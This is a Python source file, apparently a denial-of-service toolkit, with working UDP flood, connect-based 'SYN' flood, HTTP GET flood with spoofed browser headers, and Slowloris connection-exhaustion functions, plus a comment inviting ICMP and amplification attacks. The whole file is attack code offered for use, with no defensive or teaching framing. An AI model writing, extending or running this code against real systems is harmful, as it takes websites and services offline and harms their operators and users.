
import socket
import random
import threading
import time
import requests

def udp_flood(target_ip, target_port, duration):
    """
    Performs a UDP flood attack on the specified target.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            client.sendto(bytes, (target_ip, target_port))
            sent += 1
        except Exception as e:
            # print(f"Error in UDP flood: {e}") # Optional: for debugging
            pass

def tcp_syn_flood(target_ip, target_port, duration):
    """
    Performs a TCP SYN flood attack on the specified target.
    This is a raw socket operation and may require root/admin privileges.
    """
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5) # Non-blocking
                # For a true SYN flood, we'd use raw sockets to not complete the handshake.
                # However, this simplified version just initiates connections rapidly.
                # A more advanced version would use Scapy or similar libraries.
                s.connect((target_ip, target_port))
        except Exception as e:
            # print(f"Error in TCP SYN flood: {e}") # Optional: for debugging
            pass

def http_flood(target_url, duration):
    """
    Performs an HTTP GET flood attack on the specified target URL.
    """
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70, 90)}.0.{random.randint(3500, 4500)}.{random.randint(100, 200)} Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            requests.get(target_url, headers=headers, timeout=1)
        except requests.exceptions.RequestException as e:
            # print(f"Error in HTTP flood: {e}") # Optional: for debugging
            pass

def slowloris(target_ip, target_port, duration, num_sockets=200):
    """
    Performs a Slowloris attack, keeping connections open to exhaust server resources.
    """
    list_of_sockets = []
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
        "Accept-language: en-US,en,q=0.5"
    ]

    def init_socket(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in headers:
            s.send(f"{header}\r\n".encode("utf-8"))
        return s

    for _ in range(num_sockets):
        try:
            s = init_socket(target_ip, target_port)
            list_of_sockets.append(s)
        except Exception:
            break

    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            
            # Re-fill the socket pool
            diff = num_sockets - len(list_of_sockets)
            if diff > 0:
                for _ in range(diff):
                    try:
                        s = init_socket(target_ip, target_port)
                        if s:
                            list_of_sockets.append(s)
                    except Exception:
                        break
            time.sleep(15)
        except Exception:
            break

# You can add more attack methods here as needed.
# e.g., ICMP flood, amplified attacks (NTP, DNS), etc.
